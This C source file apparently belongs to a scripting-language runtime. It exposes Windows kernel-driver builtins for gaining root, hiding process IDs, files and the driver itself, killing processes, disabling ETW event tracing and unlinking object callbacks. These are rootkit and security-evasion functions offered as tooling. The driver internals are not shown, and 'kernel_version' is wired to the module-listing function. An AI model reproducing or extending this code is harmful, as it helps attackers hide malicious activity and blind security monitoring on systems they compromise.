/*
 * kernel.c — Kernel-level builtins for Windows (via driver).
 *
 * Calls into the kernel driver via kernel_bridge.c for:
 * get_root, hide_pid, unhide_pid, hide_file, kill_pid, disable_etw, etc.
 */

#include <windows.h>
#include <psapi.h>
#include "jky_builtins.h"
#include "jky_platform.h"
#include "jky_kernel_bridge.h"
#include <stdio.h>
#include <string.h>
#pragma comment(lib, "psapi.lib")

static BuiltinResult bi_get_root(VM *vm, Value *a, int c, Value *out)
{
    (void)vm; (void)a; (void)c;
    *out = mkint(jky_kmod_get_root() == 0 ? 1 : 0);
    return BUILTIN_OK;
}

static BuiltinResult bi_hide_pid(VM *vm, Value *a, int c, Value *out)
{
    (void)vm; (void)c;
    if (a[0].type != JKY_INT) { *out = mkint(0); return BUILTIN_OK; }
    *out = mkint(jky_kmod_hide_pid((int)a[0].v.i) == 0 ? 1 : 0);
    return BUILTIN_OK;
}

static BuiltinResult bi_unhide_pid(VM *vm, Value *a, int c, Value *out)
{
    (void)vm; (void)c;
    if (a[0].type != JKY_INT) { *out = mkint(0); return BUILTIN_OK; }
    *out = mkint(jky_kmod_unhide_pid((int)a[0].v.i) == 0 ? 1 : 0);
    return BUILTIN_OK;
}

static BuiltinResult bi_hide_file(VM *vm, Value *a, int c, Value *out)
{
    (void)vm; (void)c;
    if (a[0].type != JKY_STR) { *out = mkint(0); return BUILTIN_OK; }
    *out = mkint(jky_kmod_hide_file(a[0].v.s) == 0 ? 1 : 0);
    return BUILTIN_OK;
}

static BuiltinResult bi_kill_pid(VM *vm, Value *a, int c, Value *out)
{
    (void)vm; (void)c;
    if (a[0].type != JKY_INT) { *out = mkint(0); return BUILTIN_OK; }
    *out = mkint(jky_kmod_kill((int)a[0].v.i) == 0 ? 1 : 0);
    return BUILTIN_OK;
}

static BuiltinResult bi_kernel_modules(VM *vm, Value *a, int c, Value *out)
{
    (void)vm; (void)a; (void)c;

    Value arr = mkarray();
    DWORD needed = 0;
    EnumDeviceDrivers(NULL, 0, &needed);

    if (needed > 0) {
        HMODULE *mods = (HMODULE *)malloc(needed);
        if (EnumDeviceDrivers(mods, needed, &needed)) {
            DWORD count = needed / sizeof(HMODULE);
            char name[MAX_PATH];
            for (DWORD i = 0; i < count; i++) {
                if (GetDeviceDriverBaseNameA(mods[i], name, MAX_PATH)) {
                    arr_push(arr.v.arr, mkstr(name));
                }
            }
        }
        free(mods);
    }

    *out = arr;
    return BUILTIN_OK;
}

static BuiltinResult bi_disable_etw(VM *vm, Value *a, int c, Value *out)
{
    (void)vm; (void)a; (void)c;
    *out = mkint(jky_kmod_disable_etw() == 0 ? 1 : 0);
    return BUILTIN_OK;
}

static BuiltinResult bi_disable_ob_callbacks(VM *vm, Value *a, int c, Value *out)
{
    (void)vm; (void)a; (void)c;
    *out = mkint(jky_kmod_disable_ob_callbacks() == 0 ? 1 : 0);
    return BUILTIN_OK;
}

static BuiltinResult bi_hide_driver(VM *vm, Value *a, int c, Value *out)
{
    (void)vm; (void)a; (void)c;
    *out = mkint(jky_kmod_hide_driver() == 0 ? 1 : 0);
    return BUILTIN_OK;
}

const Builtin BUILTINS_KERNEL[] = {
    { "kernel_version",    0, 0, bi_kernel_modules      },
    { "kernel_modules",    0, 0, bi_kernel_modules      },
    { "kernel_hide_pid",   1, 1, bi_hide_pid            },
    { "kernel_unhide_pid", 1, 1, bi_unhide_pid          },
    { "kernel_hide_file",  1, 1, bi_hide_file           },
    { "kernel_get_root",   0, 0, bi_get_root            },
    { "kernel_kill_pid",   1, 1, bi_kill_pid            },
    { "kernel_disable_etw", 0, 0, bi_disable_etw        },
    { "kernel_unlink_callbacks", 0, 0, bi_disable_ob_callbacks },
    /* aliases */
    { "hide_pid",          1, 1, bi_hide_pid            },
    { "unhide_pid",        1, 1, bi_unhide_pid          },
    { "hide_file",         1, 1, bi_hide_file           },
    { "get_root",          0, 0, bi_get_root            },
    { "kill_pid",          1, 1, bi_kill_pid            },
    { NULL, 0, 0, NULL },
};
